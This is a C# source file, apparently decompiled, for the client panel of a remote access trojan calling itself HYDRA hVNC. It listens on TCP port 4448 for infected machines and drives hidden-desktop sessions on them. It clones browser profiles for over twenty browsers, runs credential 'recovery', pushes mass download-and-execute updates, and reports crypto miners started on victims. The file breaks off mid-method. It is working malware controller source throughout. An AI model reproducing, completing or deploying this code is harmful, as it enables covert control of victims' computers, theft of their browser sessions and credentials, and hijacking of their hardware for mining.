using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using NeonRat.Forms;
using ZEDRatApp.Forms;

namespace HYDRA_R.A.T
{
	public class Clients : Form
	{
		public int count;

		public List<TcpClient> _clientList;

		public static TcpListener _TcpListener;

		private Thread VNC_Thread;

		public static int SelectClient;

		public static bool bool_1;

		public static int int_2;

		public static bool ispressed = false;

		public static Random random = new Random();

		private IContainer components;

		private Panel panel1;

		private BunifuIconButton btnTelegram;

		private BunifuIconButton bunifuIconButton6;

		private BunifuIconButton bunifuIconButton5;

		private BunifuIconButton bunifuIconButton4;

		private BunifuIconButton bunifuIconButton3;

		private BunifuIconButton bunifuIconButton2;

		private BunifuIconButton bunifuIconButton1;

		private ImageList imageList1;

		private ImageList imageList2;

		private BunifuLabel lblRAM;

		private BunifuLabel lblCPU;

		private BunifuLabel bunifuLabel4;

		private BunifuLabel bunifuLabel3;

		private BunifuProgressBar bunifuProgressBar2;

		private BunifuProgressBar bunifuProgressBar1;

		private System.Windows.Forms.Timer timer1;

		private PerformanceCounter pRAM;

		private PerformanceCounter pCPU;

		private BunifuSeparator bunifuSeparator1;

		private BunifuLabel bunifuLabel1;

		private ColumnHeader columnHeader1;

		private ColumnHeader columnHeader2;

		private ColumnHeader columnHeader3;

		private ColumnHeader columnHeader4;

		private ColumnHeader columnHeader5;

		private ColumnHeader columnHeader6;

		private ColumnHeader columnHeader7;

		public ListView HVNCList;

		private BunifuToolTip bunifuToolTip1;

		private BunifuIconButton btnStarthvnc;

		private Guna2ContextMenuStrip guna2ContextMenuStrip1;

		private ToolStripMenuItem systemMassageToolStripMenuItem;

		private ToolStripMenuItem remoteTerminalToolStripMenuItem;

		public static string MassURL { get; set; }

		public static string saveurl { get; set; }

		public string xxhostname { get; set; }

		public string xxip { get; set; }

		public Clients()
		{
			this.InitializeComponent();
		}

		private void SetLastColumnWidth()
		{
			this.HVNCList.Columns[this.HVNCList.Columns.Count - 1].Width = -2;
		}

		private void timer_Tick(object sender, EventArgs e)
		{
			float num = this.pCPU.NextValue();
			float num2 = this.pRAM.NextValue();
			this.bunifuProgressBar1.Value = (int)num;
			this.bunifuProgressBar2.Value = (int)num2;
			this.lblCPU.Text = $"{num:0.00}%";
			this.lblRAM.Text = $"{num2:0.00}%";
		}

		private void Clients_Load(object sender, EventArgs e)
		{
			this.SetLastColumnWidth();
			this.HVNCList.Layout += delegate
			{
				this.SetLastColumnWidth();
			};
			this.HVNCList.View = View.Details;
			this.HVNCList.HideSelection = false;
			this.HVNCList.OwnerDraw = true;
			this.HVNCList.GridLines = false;
			this.HVNCList.BackColor = Color.FromArgb(9, 8, 13);
			this.HVNCList.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				SolidBrush brush = new SolidBrush(Color.FromArgb(9, 8, 13));
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
			};
			this.HVNCList.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.HVNCList.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.timer1.Start();
			this.btnClients_Click(new object(), new EventArgs());
		}

		private void metroSetSwitch7_SwitchedChanged(object sender)
		{
			if (this.bunifuLabel1.Text.Contains("Not Listening"))
			{
				new Thread((ThreadStart)delegate
				{
					this.VNC_Thread = new Thread(new ThreadStart(Listenning))
					{
						IsBackground = true
					};
					Clients.bool_1 = true;
					this.VNC_Thread.Start();
					this.bunifuLabel1.Text = "Listening";
				}).Start();
			}
			else
			{
				if (!this.bunifuLabel1.Text.Contains("Listening"))
				{
					return;
				}
				new Thread((ThreadStart)checked(delegate
				{
					IEnumerator enumerator = null;
					while (true)
					{
						try
						{
							try
							{
								enumerator = Application.OpenForms.GetEnumerator();
								while (enumerator.MoveNext())
								{
									Form form = (Form)enumerator.Current;
									if (form.Name.Contains("FrmVNC"))
									{
										form.Dispose();
									}
								}
							}
							finally
							{
								if (enumerator is IDisposable)
								{
									(enumerator as IDisposable).Dispose();
								}
							}
						}
						catch (Exception)
						{
							continue;
						}
						break;
					}
					this.VNC_Thread.Abort();
					Clients.bool_1 = false;
					this.bunifuLabel1.Text = "Not Listening";
					this.HVNCList.Items.Clear();
					Clients._TcpListener.Stop();
					try
					{
						int num = this._clientList.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							this._clientList[i].Close();
						}
						this._clientList = new List<TcpClient>();
						Clients.int_2 = 0;
						((Control)(object)new HYDRAUI().Guna2HtmlLabel).Text = "0 Online";
					}
					catch
					{
					}
				})).Start();
			}
		}

		public static string RandomNumber(int length)
		{
			return new string((from s in Enumerable.Repeat("0123456789", length)
				select s[Clients.random.Next(s.Length)]).ToArray());
		}

		public void ResultAsync(IAsyncResult iasyncResult_0)
		{
			try
			{
				TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
				tcpClient.GetStream().BeginRead(new byte[1], 0, 0, new AsyncCallback(ReadResult), tcpClient);
				Clients._TcpListener.BeginAcceptTcpClient(new AsyncCallback(ResultAsync), Clients._TcpListener);
			}
			catch (Exception)
			{
			}
		}

		public void ReadResult(IAsyncResult iasyncResult_0)
		{
			TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
			checked
			{
				try
				{
					BinaryFormatter binaryFormatter = new BinaryFormatter();
					binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
					binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
					binaryFormatter.FilterLevel = TypeFilterLevel.Full;
					byte[] array = new byte[8];
					int num = 8;
					int num2 = 0;
					while (num > 0)
					{
						int num3 = tcpClient.GetStream().Read(array, num2, num);
						num -= num3;
						num2 += num3;
					}
					ulong num4 = BitConverter.ToUInt64(array, 0);
					int num5 = 0;
					byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
					using (MemoryStream memoryStream = new MemoryStream())
					{
						int num6 = 0;
						int num7 = array2.Length;
						while (num7 > 0)
						{
							num5 = tcpClient.GetStream().Read(array2, num6, num7);
							num7 -= num5;
							num6 += num5;
						}
						memoryStream.Write(array2, 0, (int)num4);
						memoryStream.Position = 0L;
						object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
						if (objectValue is string)
						{
							string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
							try
							{
								if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
								{
									string text;
									try
									{
										text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									catch
									{
										text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									ListViewItem lvi = new ListViewItem(new string[7]
									{
										" " + array3[1].Replace(" ", null) + Clients.RandomNumber(5),
										text,
										array3[2],
										array3[3],
										array3[4],
										array3[5],
										array3[6]
									})
									{
										Tag = tcpClient,
										ImageKey = array3[3].ToString() + ".png"
									};
									HYDRAUI hvnc = new HYDRAUI();
									this.HVNCList.Invoke((MethodInvoker)delegate
									{
										lock (this._clientList)
										{
											this.HVNCList.Items.Add(lvi);
											this.HVNCList.Items[Clients.int_2].Selected = true;
											this._clientList.Add(tcpClient);
											Clients.int_2++;
											new Thread((ThreadStart)delegate
											{
												((Control)(object)hvnc.Guna2HtmlLabel).Text = Conversions.ToString(Clients.int_2) + " Online";
											});
										}
									});
								}
								else if (this._clientList.Contains(tcpClient))
								{
									this.GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
								}
								else
								{
									tcpClient.Close();
								}
							}
							catch (Exception)
							{
							}
						}
						else if (this._clientList.Contains(tcpClient))
						{
							this.GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
						}
						else
						{
							tcpClient.Close();
						}
						memoryStream.Close();
						memoryStream.Dispose();
					}
					tcpClient.GetStream().BeginRead(new byte[1], 0, 0, new AsyncCallback(ReadResult), tcpClient);
				}
				catch (Exception ex2)
				{
					if (!ex2.Message.Contains("disposed"))
					{
						try
						{
							if (this._clientList.Contains(tcpClient))
							{
								int NumberReceived;
								for (NumberReceived = Application.OpenForms.Count - 2; NumberReceived >= 0; NumberReceived += -1)
								{
									if (Application.OpenForms[NumberReceived] != null && Application.OpenForms[NumberReceived].Tag == tcpClient)
									{
										if (Application.OpenForms[NumberReceived].Visible)
										{
											base.Invoke((MethodInvoker)delegate
											{
												if (Application.OpenForms[NumberReceived].IsHandleCreated)
												{
													Application.OpenForms[NumberReceived].Close();
												}
											});
										}
										else if (Application.OpenForms[NumberReceived].IsHandleCreated)
										{
											Application.OpenForms[NumberReceived].Close();
										}
									}
								}
								lock (this._clientList)
								{
									try
									{
										int index = this._clientList.IndexOf(tcpClient);
										this._clientList.RemoveAt(index);
										this.HVNCList.Items.RemoveAt(index);
										tcpClient.Close();
										Clients.int_2--;
										((Control)(object)new HYDRAUI().Guna2HtmlLabel).Text = Conversions.ToString(Clients.int_2) + " Online";
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					tcpClient.Close();
				}
			}
		}

		private void Listenning()
		{
			checked
			{
				try
				{
					this._clientList = new List<TcpClient>();
					Clients._TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32("4448"));
					Clients._TcpListener.Start();
					Clients._TcpListener.BeginAcceptTcpClient(new AsyncCallback(ResultAsync), Clients._TcpListener);
				}
				catch (Exception ex)
				{
					try
					{
						if (ex.Message.Contains("aborted"))
						{
							return;
						}
						IEnumerator enumerator = null;
						while (true)
						{
							try
							{
								try
								{
									enumerator = Application.OpenForms.GetEnumerator();
									while (enumerator.MoveNext())
									{
										Form form = (Form)enumerator.Current;
										if (form.Name.Contains("FrmVNC"))
										{
											form.Dispose();
										}
									}
								}
								finally
								{
									if (enumerator is IDisposable)
									{
										(enumerator as IDisposable).Dispose();
									}
								}
							}
							catch (Exception)
							{
								continue;
							}
							break;
						}
						Clients.bool_1 = false;
						this.bunifuLabel1.Text = "Listening";
						int num = this._clientList.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							this._clientList[i].Close();
						}
						this._clientList = new List<TcpClient>();
						Clients.int_2 = 0;
						Clients._TcpListener.Stop();
						((Control)(object)new HYDRAUI().Guna2HtmlLabel).Text = "0 Online";
					}
					catch (Exception)
					{
					}
				}
			}
		}

		private void HVNCList_DoubleClick(object sender, EventArgs e)
		{
			if (this.HVNCList.FocusedItem.Index == -1)
			{
				return;
			}
			checked
			{
				int num = Application.OpenForms.Count - 1;
				while (true)
				{
					if (num >= 0)
					{
						if (Application.OpenForms[num].Tag == this._clientList[this.HVNCList.FocusedItem.Index])
						{
							break;
						}
						num += -1;
						continue;
					}
					FrmVNC frmVNC = new FrmVNC();
					frmVNC.Name = "VNCForm:" + Conversions.ToString(this._clientList[this.HVNCList.FocusedItem.Index].GetHashCode());
					frmVNC.Tag = this._clientList[this.HVNCList.FocusedItem.Index];
					frmVNC.Text = this.HVNCList.FocusedItem.SubItems[2].ToString().Replace("ListViewSubItem", "Status : Connected to:");
					frmVNC.Show();
					return;
				}
				Application.OpenForms[num].Show();
			}
		}

		private void HVNCList_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			e.DrawDefault = true;
		}

		public void GetStatus(object object_2, TcpClient tcpClient_0)
		{
			int hashCode = tcpClient_0.GetHashCode();
			FrmVNC frmVNC = (FrmVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(hashCode)];
			if (object_2 is Bitmap)
			{
				frmVNC.VNCBoxe.Image = (Image)object_2;
			}
			else
			{
				if (!(object_2 is string))
				{
					return;
				}
				string[] dataReceive = Conversions.ToString(object_2).Split('|');
				string left = dataReceive[0];
				if (Operators.CompareString(left, "0", TextCompare: false) == 0)
				{
					frmVNC.VNCBoxe.Tag = new Size(Conversions.ToInteger(dataReceive[1]), Conversions.ToInteger(dataReceive[2]));
				}
				if (Operators.CompareString(left, "9", TextCompare: false) != 0)
				{
					base.Invoke((MethodInvoker)delegate
					{
						try
						{
							Clipboard.SetText(dataReceive[1]);
						}
						catch (Exception)
						{
						}
					});
				}
				if (Operators.CompareString(left, "991", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "360 Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "881", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "360 Browser started successfully !";
				}
				if (Operators.CompareString(left, "992", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Atom Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "882", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Atom Browser started successfully !";
				}
				if (Operators.CompareString(left, "993", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Awast Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "883", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Awast Browser started successfully !";
				}
				if (Operators.CompareString(left, "994", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chromodo Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "884", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chromodo Browser started successfully !";
				}
				if (Operators.CompareString(left, "995", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "CocCoc Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "885", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "CocCoc Browser started successfully !";
				}
				if (Operators.CompareString(left, "996", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Comodo Dragon Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "886", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Comodo Dragon Browser started successfully!";
				}
				if (Operators.CompareString(left, "997", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Epic Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "887", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Epic Browser started successfully !";
				}
				if (Operators.CompareString(left, "998", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Opera Neon Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "888", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Opera Neon Browser started successfully!";
				}
				if (Operators.CompareString(left, "999", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Orbitum Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "889", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Orbitum Browser started successfully!";
				}
				if (Operators.CompareString(left, "1000", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Palemoon Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "2000", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Palemoon Browser started successfully!";
				}
				if (Operators.CompareString(left, "1001", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Slimjet Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "2001", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Slimjet Browser started successfully!";
				}
				if (Operators.CompareString(left, "1002", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Sputnik Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "2002", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Sputnik Browser started successfully!";
				}
				if (Operators.CompareString(left, "1003", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "UC Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "2003", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "UC Browser started successfully!";
				}
				if (Operators.CompareString(left, "1004", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Vivaldi Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "2004", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Vivaldi Browser started successfully!";
				}
				if (Operators.CompareString(left, "1005", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "WaterFox Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "2005", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "WaterFox Browser started successfully!";
				}
				if (Operators.CompareString(left, "1006", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Yandex Browser successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "2006", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Yandex Browser started successfully!";
				}
				if (Operators.CompareString(left, "200", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "201", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome successfully started !";
				}
				if (Operators.CompareString(left, "202", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "203", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox successfully started !";
				}
				if (Operators.CompareString(left, "204", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "205", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge successfully started !";
				}
				if (Operators.CompareString(left, "206", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started with clone profile !";
				}
				if (Operators.CompareString(left, "207", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !";
				}
				if (Operators.CompareString(left, "256", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed...";
				}
				if (Operators.CompareString(left, "222", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "ETH miner successfully started !";
				}
				if (Operators.CompareString(left, "223", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "ETC miner successfully started !";
				}
				if (Operators.CompareString(left, "22", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.int_0 = Conversions.ToInteger(dataReceive[1]);
					frmVNC.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(dataReceive[1]);
				}
				if (Operators.CompareString(left, "23", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(dataReceive[1]));
				}
				if (Operators.CompareString(left, "24", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Clone successfully !";
				}
				if (Operators.CompareString(left, "25", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
				}
				if (Operators.CompareString(left, "26", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
				}
				if (Operators.CompareString(left, "2555", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
				}
				if (Operators.CompareString(left, "2556", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
				}
				if (Operators.CompareString(left, "2557", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
				}
				if (Operators.CompareString(left, "3307", TextCompare: false) == 0)
				{
					Clipboard.SetText(dataReceive[1].ToString());
				}
				if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\Hydra-Recovery"))
				{
					Directory.CreateDirectory("Hydra-Recovery");
					HYDRAUI.HYDRARecoveryResults = dataReceive[1].ToString();
				}
			}
		}

		private void btnVisitUrl_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.HVNCList.SelectedItems.Count == 0)
				{
					MsgBox.Show("Operation Completed To Selected Clients: " + this.count, "HYDRA hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
					return;
				}
				new FrmURL().ShowDialog();
				if (!HYDRAUI.ispressed)
				{
					return;
				}
				FrmVNC frmVNC = new FrmVNC();
				foreach (object selectedItem in this.HVNCList.SelectedItems)
				{
					_ = selectedItem;
					this.count = this.HVNCList.SelectedItems.Count;
				}
				for (int i = 0; i < this.count; i++)
				{
					frmVNC.Name = "FrmVNC:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
					frmVNC.Tag = this.HVNCList.SelectedItems[i].Tag;
					frmVNC.hURL(HYDRAUI.saveurl);
					frmVNC.Dispose();
				}
				MsgBox.Show("Operation Completed To Selected Clients: " + this.count, "HYDRA hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
				HYDRAUI.ispressed = false;
			}
			catch (Exception)
			{
				MsgBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				base.Close();
			}
		}

		private void btnUploadExec_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.HVNCList.SelectedItems.Count == 0)
				{
					MsgBox.Show("You have to select a client first! ", "HYDRA hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
					return;
				}
				new FrmMassUpdate().ShowDialog();
				if (!HYDRAUI.ispressed)
				{
					return;
				}
				FrmVNC frmVNC = new FrmVNC();
				foreach (object selectedItem in this.HVNCList.SelectedItems)
				{
					_ = selectedItem;
					this.count = this.HVNCList.SelectedItems.Count;
				}
				for (int i = 0; i < this.count; i++)
				{
					frmVNC.Name = "FrmVNC:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
					frmVNC.Tag = this.HVNCList.SelectedItems[i].Tag;
					frmVNC.UpdateClient(HYDRAUI.MassURL);
					frmVNC.Dispose();
				}
				MsgBox.Show("Operation Completed To Selected Clients: " + this.count, "HYDRA hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
				HYDRAUI.ispressed = false;
			}
			catch (Exception)
			{
				MsgBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				base.Close();
			}
		}

		private void btnKillChrome_Click(object sender, EventArgs e)
		{
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in this.HVNCList.SelectedItems)
			{
				_ = selectedItem;
				this.count = this.HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < this.count; i++)
			{
				frmVNC.Name = "FrmVNC:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
				frmVNC.Tag = this.HVNCList.SelectedItems[i].Tag;
				frmVNC.KillChrome();
				frmVNC.Dispose();
			}
			MsgBox.Show("Operation Completed To Selected Clients: " + this.count, "HYDRA hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
		}

		private void btnRecover_Click(object sender, EventArgs e)
		{
			if (this.HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "HYDRA hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in this.HVNCList.SelectedItems)
			{
				_ = selectedItem;
				this.count = this.HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < this.count; i++)
			{
				frmVNC.Name = "FrmVNC:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
				object tag = this.HVNCList.SelectedItems[i].Tag;
				string xip = this.HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				string xhostname = this.HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				this.xxip = xip;
				this.xxhostname = xhostname;
				frmVNC.xip = xip;
				frmVNC.xhostname = xhostname;
				frmVNC.Tag = tag;
				frmVNC.HydraRecovery();
				frmVNC.Dispose();
			}
			MsgBox.Show("Operation Completed To Selected Clients: " + this.count, "HYDRA hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
		}

		private void btnRemoveHvnc_Click(object sender, EventArgs e)
		{
			if (this.HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "HYDRA hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in this.HVNCList.SelectedItems)
			{
				_ = selectedItem;
				this.count = this.HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < this.count; i++)
			{
				object tag = this.HVNCList.SelectedItems[i].Tag;
				this.HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				this.HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				this.SendTCP("8889* ", (TcpClient)tag);
				if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
				{
					break;
				}
				this.SendTCP("24*", (TcpClient)tag);
				this.SendTCP("8889* ", (TcpClient)tag);
			}
		}

		private void btnresetScale_Click(object sender, EventArgs e)
		{
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in this.HVNCList.SelectedItems)
			{
				_ = selectedItem;
				this.count = this.HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < this.count; i++)
			{
				frmVNC.Name = "FrmVNC:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
				frmVNC.Tag = this.HVNCList.SelectedItems[i].Tag;
				frmVNC.ResetScale();
				frmVNC.Dispose();
			}
			MsgBox.Show("Operation Completed To Selected Clients: " + this.count, "HYDRA hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
		}

		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						ulong num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		private void bunifuIconButton6_Click(object sender, EventArgs e)
		{
			Process.Start("http://blackhatsec.org");
		}

		private void btnClients_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.bunifuLabel1.Text.Contains("Not Listening"))
				{
					this.btnStarthvnc.Enabled = true;
					this.btnStarthvnc.Image = this.imageList2.Images[0];
					this.VNC_Thread = new Thread(new ThreadStart(Listenning))
					{
						IsBackground = true
					};
					Clients.bool_1 = true;
					this.VNC_Thread.Start();
					this.bunifuLabel1.Text = "Listening";
				}
				else
				{
					if (!this.bunifuLabel1.Text.Contains("Listening"))
					{
						return;
					}
					IEnumerator enumerator = null;
					while (true)
					{
						try
						{
							try
							{
								enumerator = Application.OpenForms.GetEnumerator();
								while (enumerator.MoveNext())
								{
									Form form = (Form)enumerator.Current;
									if (form.Name.Contains("FrmVNC"))
									{
										form.Dispose();
									}
								}
							}
							finally
							{
								if (enumerator is IDisposable)
								{
									(enumerator as IDisposable).Dispose();
								}
							}
						}
						catch (Exception)
						{
							continue;
						}
						break;
					}
					this.VNC_Thread.Abort();
					Clients.bool_1 = false;
					this.bunifuLabel1.Text = "Not Listening";
					this.btnStarthvnc.Image = this.imageList2.Images[1];
					this.btnStarthvnc.Enabled = true;
